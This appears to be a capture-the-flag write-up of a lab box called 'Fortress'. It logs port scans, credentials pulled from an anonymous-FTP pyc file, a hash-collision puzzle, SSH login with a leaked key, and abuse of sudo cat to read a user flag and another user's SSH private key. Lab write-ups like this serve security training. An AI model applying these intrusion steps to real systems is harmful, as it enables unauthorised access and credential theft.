# Fortress 

> VOiD | Friday 25 March 2022 08:19:04 AM UTC

My IP : 10.8.253.221
Target IP : 10.10.111.84

## Add to hosts
```bash
10.10.111.84   fortress
10.10.111.84   temple.fortress
```

## Rustscan
```bash
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
5581/tcp open  ftp	   syn-ack
5752/tcp open  unknown syn-ack
7331/tcp open  swx     syn-ack

```

## PORT 5581 [ftp]
```bash
anonymous login allowed
a file that is pyc

decoding that file
1337-h4x0r
n3v3r_g0nn4_g1v3_y0u_up
```

## PORT 5752 [file.pyc]
```bash
nc fortress 5752                                                           130 ⨯

	Chapter 1: A Call for help
Username: 1337-h4x0r
Password: n3v3r_g0nn4_g1v3_y0u_up
t3mple_0f_y0ur_51n5

```

## PORT 7331 [http]
```bash
http://fortress:7331/t3mple_0f_y0ur_51n5.php

view-source:http://fortress:7331/assets/style.css
/*Am I a hint??

	VGhpcyBpcyBqb3VybmV5IG9mIHRoZSBncmVhdCBtb25rcywgbWFraW5nIHRoaXMgZm9ydHJlc3MgYSBzYWNyZWQgd29ybGQsIGRlZmVuZGluZyB0aGUgdmVyeSBvd24gb2YgdGhlaXIga2luZHMsIGZyb20gd2hhdCBpdCBpcyB0byBiZSB1bmxlYXNoZWQuLi4gVGhlIG9ubHkgb25lIHdobyBjb3VsZCBzb2x2ZSB0aGVpciByaWRkbGUgd2lsbCBiZSBncmFudGVkIGEgS0VZIHRvIGVudGVyIHRoZSBmb3J0cmVzcyB3b3JsZC4gUmV0cmlldmUgdGhlIGtleSBieSBDT0xMSURJTkcgdGhvc2UgZ3VhcmRzIGFnYWluc3QgZWFjaCBvdGhlci4=
*/

This is journey of the great monks, making this fortress a sacred world, defending the very own of their kinds, from what it is to be unleashed... The only one who could solve their riddle will be granted a KEY to enter the fortress world. Retrieve the key by COLLIDING those guards against each other.

http://fortress:7331/t3mple_0f_y0ur_51n5.html

python3 chapter2.py



'The guards are in a fight with each other... Quickly retrieve the key and leave the temple: 'm0td_f0r_j4x0n.txt

http://fortress:7331/m0td_f0r_j4x0n.txt

"The Temple guards won't betray us, but I fear of their foolishness that will take them down someday. 
I am leaving my private key here for you j4x0n. Prepare the fort, before the enemy arrives"
												- h4rdy


```

## PORT 22 [ssh]
```bash
ssh h4rdy@fortress -i id_rsa 'bash --norc'


j4x0n directory
cat endgame.txt
Bwahahaha, you're late my boi!! I have already patched everything... There's nothing you can exploit to gain root... Accept your defeat once and for all, and I shall let you leave alive.

sudo -l
Matching Defaults entries for h4rdy on fortress:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User h4rdy may run the following commands on fortress:
    (j4x0n) NOPASSWD: /bin/cat

sudo -u j4x0n /bin/cat user.txt
84589a1bb8a932e46643b242a55489c0

sudo -u j4x0n /bin/cat .ssh/id_rsa
```